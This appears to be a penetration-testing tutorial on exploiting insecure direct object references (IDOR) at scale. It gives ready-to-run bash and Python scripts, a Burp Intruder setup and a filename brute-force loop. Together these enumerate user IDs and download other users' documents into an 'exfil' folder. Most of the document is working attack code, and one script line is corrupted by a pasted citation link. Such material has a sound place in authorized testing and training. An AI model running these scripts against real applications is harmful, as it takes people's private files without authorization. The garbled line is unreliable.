# Mass IDOR Enumeration

Once a basic IDOR is confirmed by manually changing one identifier and receiving another user's data, the next step is systematic enumeration to quantify the full scope of the vulnerability. Manual testing one ID at a time is impractical at scale, so the approach shifts to automation.

***

## Confirming the IDOR Before Automating

Before building any enumeration script, confirm two things manually:

1. Changing the parameter returns different data, not just the same data with a different URL
2. The data returned belongs to a different user, not a cached or default response

The common mistake of assuming `?uid=2` returned the same data as `?uid=1` because the page looks similar is avoided by inspecting the actual file links or checking the page source rather than just the visual layout. Different filenames in the response body, even if the page structure looks identical, confirm the IDOR is real. 

```bash
# Quick manual confirmation: compare responses for two UIDs
curl -s "http://target.com/documents.php?uid=1" | grep -oP "\/documents.*?\.pdf"
curl -s "http://target.com/documents.php?uid=2" | grep -oP "\/documents.*?\.pdf"
# Different filenames = confirmed IDOR
```

***

## Extracting File References from Page Source

HTML responses embed file links in predictable patterns. The grep regex approach extracts only the relevant links, stripping the surrounding HTML:

```bash
# Extract PDF links using regex between /documents and .pdf
curl -s "http://target.com/documents.php?uid=3" | grep -oP "\/documents.*?\.pdf"

# More general: extract any href containing /documents/
curl -s "http://target.com/documents.php?uid=3" | grep -oP 'href="[^"]+\/documents\/[^"]+"'

# Extract from JSON API responses
curl -s "http://target.com/api/documents?uid=3" | python3 -m json.tool | grep -oP '"url"\s*:\s*"[^"]+"'
```

Adapt the regex to match whatever pattern the application uses. The pattern `/documents.*?\.pdf` works for PDF links. For other file types, adjust the extension. For API responses returning JSON, use `python3 -m json.tool` to pretty-print then grep for URL fields.

***

## Mass Enumeration Script

The bash script below automates the full enumeration cycle: iterate through UIDs, extract all file links per UID, and download each file:

```bash
#!/bin/bash

url="http://TARGET_IP:PORT"[sycope](https://www.sycope.com/post/idor-vulnerability-how-to-detect-an-attack-on-web-applications-through-http-traffic-analysis)
output_dir="./exfil"
mkdir -p "$output_dir"

# Track unique files to avoid duplicates
declare -A downloaded

for uid in {1..100}; do
    # Fetch the page and extract document links
    links=$(curl -s "$url/documents.php?uid=$uid" | grep -oP "\/documents.*?\.pdf")
    
    if [ -z "$links" ]; then
        echo "[-] UID $uid: no documents found"
        continue
    fi
    
    echo "[+] UID $uid: found documents"
    
    for link in $links; do
        # Skip if already downloaded
        filename=$(basename "$link")
        if [ "${downloaded[$filename]}" == "1" ]; then
            continue
        fi
        
        echo "    Downloading: $link"
        wget -q -P "$output_dir" "$url/$link"
        downloaded[$filename]=1
    done
done

echo "[*] Enumeration complete. Files saved to $output_dir/"
echo "[*] Total files downloaded: ${#downloaded[@]}"
```

***

## Burp Intruder Approach

For applications that require session cookies or complex headers that are awkward to replicate in curl, Burp Intruder handles enumeration more cleanly:

```
1. Capture the request:
   GET /documents.php?uid=1 HTTP/1.1
   Cookie: session=abc123...

2. Send to Intruder (Ctrl+I)

3. Set attack type: Sniper

4. Mark the position:
   GET /documents.php?uid=§1§

5. Payload type: Numbers
   From: 1  To: 500  Step: 1

6. Start attack, sort by response length
   Responses with non-zero length = valid UIDs with documents
```

Use the Grep-Extract feature in Intruder to automatically extract file links from each response, giving you a clean list of all accessible documents without manual inspection.

***

## Python Alternative (More Control)

For applications returning JSON or requiring more complex request handling:

```python
import requests
import re
import os

base_url = "http://target.com"
session_cookie = {"session": "YOUR_SESSION_TOKEN"}
output_dir = "./exfil"
os.makedirs(output_dir, exist_ok=True)

found_files = []

for uid in range(1, 101):
    r = requests.get(
        f"{base_url}/documents.php",
        params={"uid": uid},
        cookies=session_cookie
    )
    
    if r.status_code != 200:
        continue
    
    # Extract file links
    links = re.findall(r'\/documents\/[^"\'<>\s]+\.pdf', r.text)
    
    if not links:
        continue
    
    print(f"[+] UID {uid}: {len(links)} document(s)")
    
    for link in links:
        filename = os.path.basename(link)
        filepath = os.path.join(output_dir, filename)
        
        if os.path.exists(filepath):
            continue
        
        file_response = requests.get(
            f"{base_url}{link}",
            cookies=session_cookie
        )
        
        if file_response.status_code == 200:
            with open(filepath, "wb") as f:
                f.write(file_response.content)
            print(f"    Saved: {filename}")
            found_files.append({"uid": uid, "file": filename})

print(f"\n[*] Total files downloaded: {len(found_files)}")
```

***

## Static File IDOR

The predictable filename pattern (`Invoice_1_09_2021.pdf`, `Invoice_2_08_2020.pdf`) represents a second IDOR surface independent of the `uid` parameter. Even if the `uid` parameter was fixed, the filenames themselves can be enumerated directly: 

```bash
# Enumerate files by user ID component in filename
for uid in {1..50}; do
    for month in {01..12}; do
        for year in 2020 2021 2022 2023; do
            url="http://target.com/documents/Invoice_${uid}_${month}_${year}.pdf"
            status=$(curl -s -o /dev/null -w "%{http_code}" "$url")
            if [ "$status" == "200" ]; then
                echo "[+] Found: Invoice_${uid}_${month}_${year}.pdf"
                wget -q "$url"
            fi
        done
    done
done
```

This works even if the `uid` parameter is removed from the page or protected, since the underlying files are served directly from the `/documents/` directory with predictable names. Both attack surfaces should be tested independently.
